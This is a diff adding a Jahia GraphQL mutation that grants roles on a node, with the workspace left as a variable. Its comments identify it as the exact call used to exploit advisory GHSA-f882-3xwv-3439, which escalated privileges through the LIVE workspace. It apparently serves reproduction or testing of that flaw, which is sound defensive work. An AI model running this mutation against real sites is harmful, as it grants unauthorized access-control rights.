@@ -1,0 +1,28 @@
+# Jahia core's generic node-level role grant, with the workspace left as a variable.
+#
+# This is the exact operation GHSA-f882-3xwv-3439 was exploited with: the same call, the same
+# actor and the same node, differing only in the workspace, was denied in EDIT and accepted in
+# LIVE because store-developer shipped jcr:modifyAccessControl_live at site scope. The workspace
+# is a variable precisely so the two arms can be one query with one word changed.
+#
+# Signature verified against graphql-dxm-provider 3.7.0 (GqlJcrNodeMutation.grantRoles):
+# roleNames: [String], principalType: PrincipalType, principalName: String. Jahia's security
+# filter blocks GraphQL introspection, so this was read from the provider bytecode rather than
+# from the live schema.
+mutation GrantNodeRoles(
+    $workspace: Workspace!
+    $pathOrId: String!
+    $principalType: PrincipalType!
+    $principalName: String!
+    $roleNames: [String]!
+) {
+    jcr(workspace: $workspace) {
+        mutateNode(pathOrId: $pathOrId) {
+            grantRoles(
+                roleNames: $roleNames
+                principalType: $principalType
+                principalName: $principalName
+            )
+        }
+    }
+}
